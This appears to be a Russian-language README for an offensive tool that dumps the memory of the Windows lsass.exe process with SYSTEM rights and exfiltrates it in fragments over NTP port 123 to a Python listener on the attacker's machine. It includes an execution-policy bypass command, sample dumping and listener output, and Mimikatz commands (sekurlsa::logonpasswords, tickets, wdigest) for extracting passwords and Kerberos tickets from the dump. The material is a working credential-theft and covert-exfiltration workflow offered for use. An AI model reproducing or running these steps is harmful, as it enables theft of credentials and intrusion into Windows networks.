## Установка и компиляция
### Windows (PowerShell)
Если вы используете Visual Studio Code или другую настроенную среду:
1. Откройте окно PowerShell и выполните:
   Set-ExecutionPolicy Bypass -Scope Process -Force; ./run.ps1
   Этот скрипт компилирует memdump.c, подключая необходимые библиотеки.

## Использование
1. Запустите дампер
   На Windows выполните:
   .\memdump.exe
   Введите IP адрес и порт получателя для эксфильтрации.
   Приложение должно запускаться с правами SYSTEM, чтобы получить доступ к памяти процесса.

2. Запустите слушателя
   На машине атакующего запустите:
   python3 server.py
   Скрипт слушаетпорт 123 NTP, собирает входящие фрагменты, декомпрессирует дамп памяти и сохраняет его в виде файла dump_memory.bin.

### Дампинг

[*] Введите IP получателя: 192.168.1.100
[*] Введите порт получателя: 123
[+] Расшифрован целевой процесс: lsass.exe
[+] Процесс lsass.exe найден с PID 1234
[+] Дамп памяти завершен. Размер: 16 МБ.
[+] Сжатие завершено. Сжатый размер: 512 КБ.
[+] Заголовок отправлен: 128 фрагментов, 512 КБ в сумме.
[+] Пакет с данными для фрагмента 1 из 128 отправлен.
[+] Передача завершена.

### Слушатель

[INFO] Прослушивание на 0.0.0.0:123 (общий таймаут: 30 сек)
[INFO] Заголовок получен: 128 фрагментов, 512 КБ сжатого размера.
[INFO] Получение пакетов...
[Восстановление] [========------] 50% (64/128)
[INFO] Все фрагменты получены.
[INFO] Декомпрессия...
[INFO] Дамп сохранен как dump_memory.bin.

## Анализ дампа с помощью Mimikatz
После получения файла dump_memory.bin используйте Mimikatz для извлечения информации:
- Скачайте Mimikatz:  
- Запустите Mimikatz:  
- Загрузите и проанализируйте дамп памяти: 
  mimikatz # sekurlsa::minidump dump_memory.bin
  mimikatz # sekurlsa::logonpasswords
  Первая команда загружает дамп памяти.
  Вторая команда извлекает и отображает учетные данные логонов.
- Извлечение дополнительной информации:
  mimikatz # sekurlsa::tickets
  mimikatz # sekurlsa::wdigest
  Команда sekurlsa::tickets извлекает Kerberos.
  Команда sekurlsa::wdigest извлекает данные в открытом виде, хранящиеся в WDigest.
